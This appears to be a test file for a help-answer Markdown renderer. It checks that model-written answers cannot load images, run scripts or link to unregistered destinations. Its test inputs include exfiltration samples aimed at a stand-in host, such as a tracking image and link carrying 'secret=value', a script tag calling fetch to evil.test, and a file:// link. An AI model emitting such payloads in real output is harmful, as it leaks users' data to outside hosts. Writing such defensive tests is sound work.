import { expect, it, vi } from "vite-plus/test";

import { act, render, type Screen } from "../../../test/render";

const state = vi.hoisted(() => ({
  openExternal: vi.fn(async (_url: string) => undefined),
}));
vi.mock(import("../../localApi"), async (original) => ({
  ...(await original()),
  ensureLocalApi: (() => ({ shell: { openExternal: state.openExternal } })) as never,
}));
vi.mock(import("@t3tools/shared/HostProcess"), () => {
  throw new Error("Help rendering must not initialize host process services.");
});

import { HelpMarkdown } from "./HelpMarkdown";
import { HELP_ISSUE_TRACKER_URL } from "./helpLinks";

function setup() {
  state.openExternal.mockClear();
}

const renderAnswer = (content: string) => render(<HelpMarkdown content={content} />);
const hrefs = (screen: Screen) =>
  [...screen.container.querySelectorAll("a")].map((node) => node.getAttribute("href"));
const anchor = (screen: Screen, href: string) =>
  screen.container.querySelector<HTMLAnchorElement>(`a[href="${href}"]`)!;
const location = (screen: Screen) => {
  const { pathname, hash } = screen.router!.state.location;
  return { pathname, hash };
};

it("renders readable answers without loading model images or enabling unexpected links or HTML", async () => {
  setup();
  await using screen = await renderAnswer(
    [
      "Check **Providers** first.",
      "![tracking](https://evil.test/collect?secret=value)",
      '<img src="https://evil.test/html-image"><script>fetch("https://evil.test")</script>',
      "[unexpected](https://evil.test/collect?secret=value)",
      "[payload](/settings/providers?secret=value)",
      "[file](file:///Users/private)",
      "[Providers](/settings/providers)",
      `[Issue tracker](${HELP_ISSUE_TRACKER_URL})`,
    ].join("\n\n"),
  );
  expect(screen.container.textContent).toContain("Check Providers first.");
  expect(screen.container.querySelector("img, script, iframe, video, audio")).toBeNull();
  expect(hrefs(screen)).toEqual(["/settings/providers", HELP_ISSUE_TRACKER_URL]);
  expect(location(screen)).toEqual({ pathname: "/", hash: "" });
  await act(async () => anchor(screen, HELP_ISSUE_TRACKER_URL).click());
  expect(state.openExternal).toHaveBeenCalledExactlyOnceWith(HELP_ISSUE_TRACKER_URL);
  expect(location(screen)).toEqual({ pathname: "/", hash: "" });
  await act(async () => anchor(screen, "/settings/providers").click());
  await expect.poll(() => location(screen)).toEqual({ pathname: "/settings/providers", hash: "" });
  expect(state.openExternal).toHaveBeenCalledTimes(1);
});

it("navigates to registered settings anchors while keeping rejected destinations readable", async () => {
  setup();
  await using screen = await renderAnswer(
    [
      "[Computer use](/settings/general#computer-use)",
      "[Keep worktrees](/settings/storage#storage-worktrees)",
      "[Wrong route](/settings/providers#computer-use)",
      "[Displaced ID](/settings/storage#storage-worktree-keep-when)",
      "[Unknown route](/settings/not-registered)",
      "[Empty anchor](/settings/providers#)",
    ].join("\n\n"),
  );
  expect(hrefs(screen)).toEqual([
    "/settings/general#computer-use",
    "/settings/storage#storage-worktrees",
  ]);
  for (const label of ["Wrong route", "Displaced ID", "Unknown route", "Empty anchor"]) {
    expect(screen.container.textContent).toContain(label);
  }
  expect(location(screen)).toEqual({ pathname: "/", hash: "" });
  await act(async () => anchor(screen, "/settings/general#computer-use").click());
  await expect
    .poll(() => location(screen))
    .toEqual({ pathname: "/settings/general", hash: "computer-use" });
  expect(state.openExternal).not.toHaveBeenCalled();
});

it("keeps answer headings below the conversation's own headings for screen readers", async () => {
  setup();
  await using screen = await renderAnswer(
    ["# Steps", "## Details", "###### Fine print"].join("\n\n"),
  );
  expect(
    [...screen.container.querySelectorAll("h1, h2, h3, h4, h5, h6")].map((node) => [
      node.textContent,
      node.getAttribute("aria-level"),
    ]),
  ).toEqual([
    ["Steps", "4"],
    ["Details", "5"],
    ["Fine print", "6"],
  ]);
});

it("renders a model's table as rows in a keyboard-scrollable region, with only registered links", async () => {
  setup();
  await using screen = await renderAnswer(
    [
      "| Plugin | Where |",
      "| --- | --- |",
      "| Jira | [Plugins](/settings/plugins) |",
      "| Leak | [collect](https://evil.test/collect?secret=value) |",
    ].join("\n"),
  );
  const region = screen.container.querySelector<HTMLElement>('[role="region"]')!;
  expect(region.getAttribute("aria-label")).toBe("Help table");
  expect([...region.querySelectorAll("thead th")].map((cell) => cell.textContent)).toEqual([
    "Plugin",
    "Where",
  ]);
  expect(
    [...region.querySelectorAll("tbody tr")].map((row) =>
      [...row.querySelectorAll("td")].map((cell) => cell.textContent),
    ),
  ).toEqual([
    ["Jira", "Plugins"],
    ["Leak", "collect"],
  ]);
  expect(screen.container.textContent).not.toContain("|");
  expect(hrefs(screen)).toEqual(["/settings/plugins"]);
  region.focus();
  expect(document.activeElement).toBe(region);
});

it("keeps GFM autolinks as text unless resolveHelpLink allows the destination", async () => {
  setup();
  await using screen = await renderAnswer(
    [
      "Bare addresses stay text: https://evil.test/collect?secret=value, www.evil.test, and attacker@evil.test.",
      `Report it at ${HELP_ISSUE_TRACKER_URL}`,
    ].join("\n\n"),
  );
  expect(hrefs(screen)).toEqual([HELP_ISSUE_TRACKER_URL]);
  for (const address of [
    "https://evil.test/collect?secret=value",
    "www.evil.test",
    "attacker@evil.test",
  ]) {
    expect(screen.container.textContent).toContain(address);
  }
  await act(async () => anchor(screen, HELP_ISSUE_TRACKER_URL).click());
  expect(state.openExternal).toHaveBeenCalledExactlyOnceWith(HELP_ISSUE_TRACKER_URL);
  expect(location(screen)).toEqual({ pathname: "/", hash: "" });
});

it.each(["plugins", "skills", "scheduled-tasks"])(
  "opens the %s settings page even without searchable setting rows",
  async (section) => {
    setup();
    const to = `/settings/${section}`;
    await using screen = await renderAnswer(`[Open settings](${to})`);
    expect(hrefs(screen)).toEqual([to]);
    await act(async () => anchor(screen, to).click());
    await expect.poll(() => location(screen)).toEqual({ pathname: to, hash: "" });
  },
);
